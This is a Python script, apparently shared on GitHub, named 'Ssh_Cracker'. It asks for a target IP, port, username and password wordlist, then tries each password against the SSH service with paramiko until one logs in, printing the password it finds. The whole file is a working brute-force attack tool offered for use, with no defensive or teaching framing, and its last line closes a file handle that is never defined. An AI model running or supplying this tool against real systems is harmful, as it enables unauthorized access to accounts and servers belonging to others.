import paramiko
import sys
import os
import time

from cfonts import render
from termcolor import colored

banner = render("Ssh_Cracker", colors=['blue', 'yellow'], align='center')
print(banner)

print('Warning: SSH service must be activated status .')

print("======================================================")


cred='Coded by:--> @AnandGurav'
print(colored(cred,'red'))
lang='Github:--> Anand201096'
print(colored(lang,'red'))
print("======================================================")


target = str(input(colored('[*]Please enter target IP address: ', 'red')))
port = str(input(colored('[*] Please enter the SSH port number: ', 'red')))
username = str(input(colored('[*] Please enter username to bruteforce: ', 'red')))
password_file = str(input(colored('[*] Please enter location of the password file: ', 'red')))



def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code
    
print("\n")

offset = 5
time.sleep(1)
print("Loading:")

#animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
animation = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

for i in range(len(animation)):
    time.sleep(0.3)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

print("\n")




with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
            	 print(colored('[+] Password Found:--> ', 'green'), password)
            	 exit(0)
            elif response == 1:
                print(colored('[-] Incorrect Password:--> ', 'red'), password)
        except Exception as e:
            print(e)
        pass

input_file.close()
